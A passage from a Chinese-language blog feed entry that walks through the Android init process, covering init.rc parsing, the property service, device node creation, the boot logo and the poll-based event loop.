函数用于通知全局变量 signal_fd，SIGCHLD 信号已经发生。</p><h2 id="main-目录生成与挂载"><a class="anchor" href="#main-目录生成与挂载">#</a> main () 目录生成与挂载</h2><p>init 在注册完信号处理器后，创建并挂在启动所需目录。</p><h2 id="初始化-log-输出设备"><a class="anchor" href="#初始化-log-输出设备">#</a> 初始化 log 输出设备</h2><p>通过调用 log_init () 函数初始化 log 输出设备。</p><h2 id="解析-initrc-文件"><a class="anchor" href="#解析-initrc-文件">#</a> 解析 init.rc 文件</h2><p>init.rc 文件是 init 启动后执行的启动脚本，文件中记录着 init 进程执行的功能。在 Linux 系统中，它被定义在根文件系统的 /etc/rc.d/ 目录下，是启动时的可执行文件。<br />init.rc 文件在 Android 系统运行过程中用于通用的环境设置以及进程相关的定义，init.{hardware}.rc 用于定义 Android 在不同平台下的特定进程和环境设置等。<br />parse_config_file () 文件用于分析.rc 配置文件，参数为文件路径。读取 init.rc 文件后，生成动作列表与服务列表。根据 init.{hardware}.rc 生成的动作列表和服务列表会被添加到已生成的对应列表中去。</p><h2 id="执行-early-init-动作"><a class="anchor" href="#执行-early-init-动作">#</a> 执行 early-init 动作</h2><p>init 进程会依次执行 &quot;early-init , init ,early-boot , boot&quot; 片段中的命令。<br />通过 action_for_each_trigger () 将 early-init 中的命令保存到队列 action_add_queue_tail 中，之后通过 drain_action_queue () 函数将运行队列中的命令逐一取出执行。</p><h2 id="创建定义好的设备节点文件"><a class="anchor" href="#创建定义好的设备节点文件">#</a> 创建定义好的设备节点文件</h2><p>通过 device_init () 生成静态设备节点。</p><h2 id="初始化属性服务"><a class="anchor" href="#初始化属性服务">#</a> 初始化属性服务</h2><p>调用 property_init () 函数，在共享内存区域中，创建并初始化属性域。而后通过执行中的进程所提供的 API，访问属性域中的设置值。但更改属性值操作只能在 init 进程中运行，当修改属性值时，要预先向 init 进程提交值变更申请，然后 init 进程处理该申请，并修改属性值。</p><h2 id="显示启动-logo"><a class="anchor" href="#显示启动-logo">#</a> 显示启动 logo</h2><p>使用 load_565rle_image () 函数将文件显示在屏幕上，只需修改 INIT_IMAGE_FILE 即可更改启动 Logo。</p><h2 id="属性初始设置"><a class="anchor" href="#属性初始设置">#</a> 属性初始设置</h2><p>通过 property_set () 函数向属性域设置系统所需的一些初始值。这些设置的属性值由执行中的多种进程通过 property_get () API 来访问。</p><h2 id="执行-init-动作"><a class="anchor" href="#执行-init-动作">#</a> 执行 init 动作</h2><p>同 early-init。</p><h2 id="启动属性服务"><a class="anchor" href="#启动属性服务">#</a> 启动属性服务</h2><p>除了先前设置的属性外，start_property_service () 还会读取几个设置文件，并对属性进行初始化。在根文件系统的 /data/property 目录下，保存着进程生成或修改的属性值。向 init 提交修改申请后，init 进程生成 /dev/socket/property_service 来接受其它进程提交的申请。</p><h2 id="创建套接字"><a class="anchor" href="#创建套接字">#</a> 创建套接字</h2><p>用于 init 进程在收到子进程终止的信号时调用相应的 handler。</p><h2 id="执行与-action-list-的-early-bootbootproperty-相关的命令"><a class="anchor" href="#执行与-action-list-的-early-bootbootproperty-相关的命令">#</a> 执行与 Action List 的 early-boot,boot,property 相关的命令</h2><p>在 init.rc 文件的 boot 区段有一条 class_start 命令，用来逐一执行存在于服务列表中的进程列表。</p><h2 id="设置事件处理循环的监视事件"><a class="anchor" href="#设置事件处理循环的监视事件">#</a> 设置事件处理循环的监视事件</h2><p>注册在 POLL 中的文件描述符会在 poll () 函数中等待事件发生，若事件发生，则从 poll 函数中跳出并处理事件。<br />在确认事件发生前，先要在 action list 的命令中确认是否有尚未执行的命令，并执行这些命令。起初，在事件处理循环中，action list 与 service list 未含有需要执行的事情，但是在处理过注册的事件后，init 进程要做的事情会重新注册到 action list 与 service list 中。<br />当事件发生时，事件信息会保存在 pollfd 结构体的 udfs.revents 变量中，当 poll () 函数返回后，可以在 udfs 数组中的 revents 中查看哪些事件已经发生。<br />当子进程终止时，会产生 SIGCHLD 信号，POLLIN 事件会被注册到 udfs [2],revents 中。<br />在 Android 系统运行过程中，插入热的拔插设备时，将生成设备节点文件。<br />这部分函数还会处理属性变更请求。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Android 框架中 init 进程的相关知识。&lt;br /&gt;</summary>
    
    
    
    <category term="Android" scheme="http://ericcd.com/categories/Android/"/>
    
    
    <category term="Knowledge" scheme="http://ericcd.com/tags/Knowledge/"/>
    
  </entry>
  
</feed>
